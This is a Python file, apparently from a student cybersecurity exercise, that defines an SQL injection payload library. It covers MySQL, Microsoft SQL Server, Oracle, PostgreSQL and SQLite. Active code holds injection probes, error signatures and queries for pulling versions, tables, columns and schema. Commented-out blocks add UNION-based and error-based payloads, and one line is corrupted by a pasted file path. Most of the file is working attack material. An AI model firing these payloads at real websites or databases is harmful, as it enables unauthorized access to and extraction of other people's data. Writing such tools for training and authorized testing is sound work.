class Query:
    checks = {
        'error': ["'"],
        'boolean': ["1' AND 1=1 -- ", "1' AND 1=2 -- "],
        'columns': ["' ORDER BY {} -- "],
    }

    errors = {
        'MySQL': "You have an error in your SQL syntax;",
        'Microsoft': "Unclosed quotation mark",
        'Oracle': "ORA-",
        'PostgreSQL': "ERROR: syntax error at",
        'SQLite': 'near "\'": syntax error'
    }

    versions = {
        'MySQL': {
            'select': "@@version",
            'from': ""
        },
        'Microsoft': {
            'select': "@@version",
            'from': ""
        },
        'Oracle': {
            'select': "banner FROM v$version WHERE rownum = 1",
            'from': ""
        },
        'PostgreSQL': {
            'select': "version()",
            'from': ""
        },
        'SQLite': {
            'select': "sqlite_version()",
            'from': ""
        }
    }

    tables = {
        'MySQL': {
            'select': "GROUP_CONCAT(table_name SEPARATOR ',')",
            'from': "FROM information_schema.tables WHERE table_schema=database()"
        },
        'PostgreSQL': {
            'select': "string_agg(table_name,',')",
            'from': "FROM information_schema.tables WHERE table_schema='public'"
        },
        'SQLite': {
            'select': "GROUP_CONCAT(name,',')",
            'from': "FROM sqlite_master WHERE type='table'"
        },
        'Microsoft': {
            'select': "STRING_AGG(table_name,',')",
            'from': "FROM information_schema.tables"
        },
        'Oracle': {
            'select': "LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name)",
            'from': "FROM user_tables"
        },
    }

    columns = {
        'MySQL': {
            'select': "GROUP_CONCAT(table_name,0x3a,column_name SEPARATOR ',')",
            'from': "FROM information_schema.columns WHERE table_schema=database()"
        },
        'PostgreSQL': {
            'select': "string_agg(table_name||':'||column_name,',')",
            'from': "FROM information_schema.columns WHERE table_schema='public'"
        },
        'SQLite': {
            'select': "GROUP_CONCAT(name,',')",
            'from': "FROM pragma_table_info('{}') "
        },
        'Microsoft': {
            'select': "STRING_AGG(table_name+':'+column_name,',')",
            'from': "FROM information_schema.columns"
        },
        'Oracle': {
            'select': "LISTAGG(table_name||':'||column_name,',') WITHIN GROUP (ORDER BY table_name)",
            'from': "FROM user_tab_columns"
        }
    }

    dump = {
        'MySQL': {
            'select': "GROUP_CONCAT(table_name,0x3a,column_name,0x3a,column_type SEPARATOR '|')",
            'from': "FROM information_schema.columns WHERE table_schema=database()"
        },
        'PostgreSQL': {
            'select': "string_agg(table_name||':'||column_name||':'||data_type,'|')",
            'from': "FROM information_schema.columns WHERE table_schema='public'"
        },
        'SQLite': {
            'select': "GROUP_CONCAT(name||':'||type,'|')",
            'from': "FROM pragma_table_info('{}')"
        },
        'Microsoft': {
            'select': "STRING_AGG(table_name+':'+column_name+':'+data_type,'|')",
            'from': "FROM information_schema.columns"
        },
        'Oracle': {
            'select': "LISTAGG(table_name||':'||column_name||':'||data_type,'|') WITHIN GROUP (ORDER BY table_name)",
            'from': "FROM user_tab_columns"
        }
    }

# class Query:
#     checks = {
#         'error': ["'"],
#         'boolean': ["1' AND 1=1 -- ", "1' AND 1=2 -- "],
#         'union': ["' UNION SELECT NULL -- ", "' UNION SELECT NULL, NULL -- ", "' UNION SELECT NULL, NULL, NULL -- "],
#     }

#     errors = {
#         'MySQL': "You have an error i/workspaces/Cybersecurity-Pool/06_Vaccine/srcs/vaccinen your SQL syntax;",
#         'Microsoft': "Unclosed quotation mark",
#         'Oracle': "' UNION SELECT banner FROM v$version WHERE rownum = 1 -- ",
#         'PostgreSQL': "ERROR: syntax error at",
#         'SQLite': 'near "\'\": syntax error' 
#     }

#     versions = {
#         'MySQL': "' UNION SELECT @@version -- ",
#         'Microsoft': "' UNION SELECT @@version -- ",
#         'Oracle': "' UNION SELECT banner FROM v$version WHERE rownum = 1 -- ",
#         'PostgreSQL': "' UNION SELECT version() -- ",
#         'SQLite': "' UNION SELECT sqlite_version() -- "
#     }

#     tables = {
#         'MySQL': "' UNION SELECT * FROM information_schema.tables -- ",
#         'Microsoft': "' UNION SELECT * FROM information_schema.tables -- ",
#         'Oracle': "' UNION SELECT * FROM all_tables -- ",
#         'PostgreSQL': "' UNION SELECT SELECT * FROM information_schema.tables -- ",
#         'SQLite': "' UNION SELECT name FROM sqlite_master WHERE type='table' -- "
#     }

#     columns = {
#         'MySQL': "' UNION SELECT column_name, data_type FROM information_schema.columns ' -- ",
#         'Microsoft': "' UNION SELECT column_name, data_type FROM information_schema.columns  -- ",
#         'Oracle': "' UNION SELECT column_name FROM all_cons_columns  -- ",
#         'PostgreSQL': "' UNION SELECT column_name FROM information_schema.columns  -- ",
#         'SQLite': "' UNION SELECT sql FROM sqlite_master  -- " 
#     }

#     dump = {
#         'MySQL': "' UNION SELECT GROUP_CONCAT(table_name,':',column_name SEPARATOR '|') FROM information_schema.columns--",
#         'Microsoft': "' UNION SELECT STRING_AGG(table_name+':'+column_name, '|') FROM information_schema.columns--",
#         'Oracle': "' UNION SELECT LISTAGG(table_name||':'||column_name, '|') WITHIN GROUP (ORDER BY table_name) FROM all_tab_columns--",
#         'PostgreSQL': "' UNION SELECT STRING_AGG(table_name||':'||column_name, '|') FROM information_schema.columns--",
#         'SQLite': "' UNION SELECT GROUP_CONCAT(tbl_name||':'||sql, '|') FROM sqlite_master WHERE type='table'--"
#     }




    # versions = {
    #     'MySQL': "' AND extractvalue(1,concat(0x7e,@@version)) AND '1'='1",
    #     'Microsoft': "' AND 1=CAST((SELECT @@version) AS int) AND '1'='1",
    #     'Oracle': "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1)) AND '1'='1",
    #     'PostgreSQL': "' AND 1=CAST((SELECT version()) AS int) AND '1'='1",
    #     'SQLite': "' AND 1 IN (SELECT sqlite_version()) AND '1'='1"
    # }

    # tables = {
    #     'MySQL': "' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()))) AND '1'='1",
    #     'Microsoft': "' AND 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables) AS int) AND '1'='1",
    #     'Oracle': "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables)) AND '1'='1",
    #     'PostgreSQL': "' AND 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int) AND '1'='1",
    #     'SQLite': "' AND 1 IN (SELECT GROUP_CONCAT(name,',') FROM sqlite_master WHERE type='table') AND '1'='1"
    # }

    # columns = {
    #     'MySQL': "' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(CONCAT(table_name,':',column_name) SEPARATOR ',') FROM information_schema.columns WHERE table_schema=database()))) AND '1'='1",
    #     'Microsoft': "' AND 1=CAST((SELECT STRING_AGG(table_name+':'+column_name,',') FROM information_schema.columns) AS int) AND '1'='1",
    #     'Oracle': "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT LISTAGG(table_name||':'||column_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tab_columns)) AND '1'='1",
    #     'PostgreSQL': "' AND 1=CAST((SELECT STRING_AGG(table_name||':'||column_name,',') FROM information_schema.columns WHERE table_schema='public') AS int) AND '1'='1",
    #     'SQLite': "' AND 1 IN (SELECT GROUP_CONCAT(name||':'||sql,',') FROM sqlite_master WHERE type='table') AND '1'='1"
    # }

    # dump = {
    #     'MySQL': "' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(CONCAT(table_name,'|',column_name) SEPARATOR ',') FROM information_schema.columns WHERE table_schema=database()))) AND '1'='1",
    #     'Microsoft': "' AND 1=CAST((SELECT STRING_AGG(table_name+'|'+column_name,',') FROM information_schema.columns) AS int) AND '1'='1",
    #     'Oracle': "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT LISTAGG(table_name||'|'||column_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tab_columns)) AND '1'='1",
    #     'PostgreSQL': "' AND 1=CAST((SELECT STRING_AGG(table_name||'|'||column_name,',') FROM information_schema.columns WHERE table_schema='public') AS int) AND '1'='1",
    #     'SQLite': "' AND 1 IN (SELECT GROUP_CONCAT(tbl_name||'|'||name,',') FROM sqlite_master WHERE type='table') AND '1'='1"
    # }


    # errors = {
    #     'MySQL': "You have an error in your SQL syntax;",
    #     'Microsoft': "Unclosed quotation mark",
    #     'Oracle': "ORA-",
    #     'PostgreSQL': "ERROR: syntax error at",
    #     'SQLite': 'near "\'": syntax error'
    # }

    # versions = {
    #     'MySQL': "@@version",
    #     'Microsoft': "@@version",
    #     'Oracle': "(SELECT banner FROM v$version WHERE rownum = 1)",
    #     'PostgreSQL': "version()",
    #     'SQLite': "sqlite_version()"
    # }

    # tables = {
    #     'MySQL': "(SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database())",
    #     'Microsoft': "(SELECT STRING_AGG(table_name,',') FROM information_schema.tables)",
    #     'Oracle': "(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables)",
    #     'PostgreSQL': "(SELECT STRING_AGG(table_name,',') FROM information_schema.tables WHERE table_schema='public')",
    #     'SQLite': "(SELECT GROUP_CONCAT(name,',') FROM sqlite_master WHERE type='table')"
    # }

    # columns = {
    #     'MySQL': "(SELECT GROUP_CONCAT(CONCAT(table_name,':',column_name) SEPARATOR ',') FROM information_schema.columns WHERE table_schema=database())",
    #     'Microsoft': "(SELECT STRING_AGG(table_name+':'+column_name,',') FROM information_schema.columns)",
    #     'Oracle': "(SELECT LISTAGG(table_name||':'||column_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tab_columns)",
    #     'PostgreSQL': "(SELECT STRING_AGG(table_name||':'||column_name,',') FROM information_schema.columns WHERE table_schema='public')",
    #     'SQLite': "(SELECT GROUP_CONCAT(name||':'||sql,',') FROM sqlite_master WHERE type='table')"
    # }

    # dump = {
    #     'MySQL': "(SELECT GROUP_CONCAT(CONCAT(table_name,'|',column_name) SEPARATOR ',') FROM information_schema.columns WHERE table_schema=database())",
    #     'Microsoft': "(SELECT STRING_AGG(table_name+'|'+column_name,',') FROM information_schema.columns)",
    #     'Oracle': "(SELECT LISTAGG(table_name||'|'||column_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tab_columns)",
    #     'PostgreSQL': "(SELECT STRING_AGG(table_name||'|'||column_name,',') FROM information_schema.columns WHERE table_schema='public')",
    #     'SQLite': "(SELECT GROUP_CONCAT(tbl_name||'|'||name,',') FROM sqlite_master WHERE type='table')"
    # }